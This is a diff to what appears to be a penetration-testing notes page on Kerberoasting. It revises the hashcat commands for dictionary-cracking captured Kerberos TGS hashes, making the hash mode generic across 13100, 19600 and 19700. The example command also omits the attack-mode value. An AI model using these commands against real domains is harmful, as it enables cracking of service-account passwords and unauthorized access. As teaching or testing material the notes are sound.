@@ -78,14 +78,14 @@ C:\> Rubeus.exe kerberoast
 ### (3) Perform dictionary attack on the obtained TGS
 
 ```sh
-$ hashcat -a 0 -m 13100 <path_to_spn_hash> <wordlist>
+$ hashcat -a 0 -m <hash_mode> <path_to_spn_hash> <wordlist>
 # eg. 
 $ echo xxx > spn.hash 
-$ hashcat -a -m 13100 spn.hash /usr/share/wordlist/rockyou.txt
+$ hashcat -a -m <hash_mode> spn.hash /usr/share/wordlist/rockyou.txt
 ```
 
 * `-a`: Attack mode&#x20;
   * `-a 0`: Dictionary attack&#x20;
 * `-m` : Hash mode&#x20;
-  * `-m 13100`: **Kerberos 5, etype 23, TGS-REP**
+  * `-m 13100`: either one of **13100, 19600, 19700** (depending on the encryption type of the hashes obtained)
 
